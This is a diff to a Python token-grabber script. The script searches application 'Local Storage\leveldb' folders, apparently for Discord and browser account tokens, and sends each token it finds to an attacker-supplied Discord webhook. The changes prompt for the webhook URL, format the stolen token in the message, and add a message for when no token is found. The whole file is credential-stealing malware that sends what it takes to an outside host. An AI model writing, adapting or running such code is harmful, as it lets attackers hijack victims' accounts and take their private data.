@@ -2,8 +2,9 @@ import re
 import os
 import dhooks
 
-WEBHOOK_URL = ""
-
+# Uncomment and remove the 7th line (WEBHOOK_URL = input("Webhook")) to hardcode your webhook URL
+#WEBHOOK_URL = ""
+WEBHOOK_URL = input("Webhook")
 
 def find_tokens(path):
     path += r'\Local Storage\leveldb'
@@ -44,7 +45,8 @@ def get_accounts():
                 
                 # Sends the info through the webhook
                 wb = dhooks.Webhook(WEBHOOK_URL)
-                wb.send(f"Platform: {platform}\tToken: {token}")
+                wb.send(f"Platform: `{platform}`\tToken: ```{token}```")
 
-
+        else:
+            print("No Token Found! \n Either doesn't exist or is locked")
 get_accounts()
